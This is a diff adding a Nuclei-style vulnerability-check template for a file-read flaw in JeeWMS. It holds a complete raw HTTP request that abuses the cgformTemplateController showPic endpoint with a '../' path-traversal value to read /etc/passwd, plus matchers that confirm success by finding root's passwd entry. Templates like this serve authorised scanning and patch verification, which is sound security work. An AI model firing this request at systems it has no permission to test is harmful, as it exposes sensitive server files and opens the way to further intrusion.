@@ -1,0 +1,34 @@
+id: jeewms-cgformtemplatecontroller-fileread
+
+info:
+  name: JeeWMS 文件读取漏洞
+  author: onewin
+  severity: high
+  tags: JeeWMS
+  description: |
+    JeeWMS 存在文件读取漏洞，攻击者可以利用该漏洞读取服务器上的敏感文件，例如 /etc/passwd。
+    
+http:
+  - raw:
+      - |
+        POST /rest/../cgformTemplateController.do?showPic HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: en-US,en;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 58
+
+        code=default&path=../../../../../../../../../../etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"  # Typical content in /etc/passwd
